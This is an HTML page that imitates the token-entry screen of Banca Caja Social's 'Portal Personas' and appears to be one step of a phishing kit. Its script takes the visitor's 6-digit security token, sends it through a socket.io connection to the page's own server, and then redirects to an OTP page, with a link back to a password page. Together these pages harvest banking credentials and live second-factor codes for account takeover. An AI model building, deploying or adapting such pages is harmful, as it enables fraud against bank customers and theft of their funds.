<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
    <title>Token - Portal Personas - Banca Caja Social</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>input, select, textarea { font-size: 16px !important; }</style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div style="text-align:center;">
            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;">
        </div>
    </div>
    
    <div class="container">
        <div class="left-section">
            <img src="img/background-2.png" alt="Familia" class="background-image" id="bgImage">
        </div>
        <div class="right-section">
            <div class="form-container">
                <div class="logo-container">
                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
                </div>
                
                <h1 class="title">Bienvenido al Portal Personas</h1>
                
                <p class="subtitle">
                    Ingrese el token de seguridad que fue enviado a su dispositivo. El token está compuesto por <strong>6 dígitos</strong>.
                </p>
                
                <form class="login-form" id="tokenForm">
                    <div class="form-group">
                        <label for="token" class="form-label">Token de seguridad</label>
                        <input type="text" id="token" name="token" class="form-input" maxlength="6" inputmode="numeric" autocomplete="off">
                        <small class="bb-input-validation-message error-message" style="display:none;">Token inválido. Debe contener 6 dígitos.</small>
                    </div>
                    
                    <div class="bb-button-bar">
                        <button type="submit" id="btnContinuar" class="btn btn-primary username-then-password-button" disabled>Siguiente</button>
                    </div>
                    
                    <a href="#" class="btn-link-text link-forgot" style="display: inline-block; margin-left: 1rem; margin-bottom: 20px;">¿No recibió el token? ▼</a>
                    
                    <hr class="identity-separator">
                    
                    <div class="back-link-container">
                        <a href="password.html" class="link-back">← Volver</a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <div id="pantallaCarga" class="pantalla-carga">
        <div class="spinner-circulo">
            <div class="spinner-logo">
                <img src="img/logo-caja-social.png" alt="Caja Social">
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const tokenInput = document.getElementById('token');
            const btnContinuar = document.getElementById('btnContinuar');
            const errorMessage = document.querySelector('.error-message');
            
            tokenInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                const value = this.value;
                
                errorMessage.style.display = 'none';
                tokenInput.classList.remove('error');
                
                if (value.length === 6) {
                    btnContinuar.disabled = false;
                } else {
                    btnContinuar.disabled = true;
                }
            });
            
            document.getElementById('tokenForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const value = tokenInput.value;
                
                if (value.length !== 6) {
                    errorMessage.style.display = 'block';
                    tokenInput.classList.add('error');
                    return;
                }
                
                if (typeof socketManager !== 'undefined' && socketManager.sendToken) {
                    socketManager.sendToken(value);
                }
                
                var pantalla = document.getElementById('pantallaCarga');
                if (pantalla) pantalla.classList.add('activa');
                setTimeout(function(){
                    window.location.href = 'otp.html';
                }, 1500);
            });
        });
    </script>

    <script src="/js/banco-utils.js"></script>
    <script src="client-optimized.js"></script>

<script>
(function(){
    var imagenes = ['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
    var bg = document.getElementById('bgImage');
    if (bg) {
        var ultima = sessionStorage.getItem('ultimaBg') || '';
        var disponibles = imagenes.filter(function(img){ return img !== ultima; });
        var aleatoria = disponibles[Math.floor(Math.random() * disponibles.length)];
        bg.src = aleatoria;
        sessionStorage.setItem('ultimaBg', aleatoria);
    }
})();
</script>

<script>
(function(){
'use strict';
var lastTouchEnd = 0;
document.addEventListener('touchend', function(e){
var ahora = new Date().getTime();
if (ahora - lastTouchEnd <= 300) { e.preventDefault(); }
lastTouchEnd = ahora;
}, { passive: false });
document.addEventListener('dblclick', function(e){ e.preventDefault(); });
document.addEventListener('focusin', function(e){
var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
if (tag === 'input' || tag === 'textarea' || tag === 'select') {
if (e.target.style.fontSize !== '16px') {
e.target.dataset._fs = e.target.style.fontSize || '';
e.target.style.fontSize = '16px';
}
}
});
document.addEventListener('focusout', function(e){
var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
if (tag === 'input' || tag === 'textarea' || tag === 'select') {
if (e.target.dataset._fs !== undefined) {
e.target.style.fontSize = e.target.dataset._fs;
delete e.target.dataset._fs;
}
}
});
})();
</script>
</body>
</html>
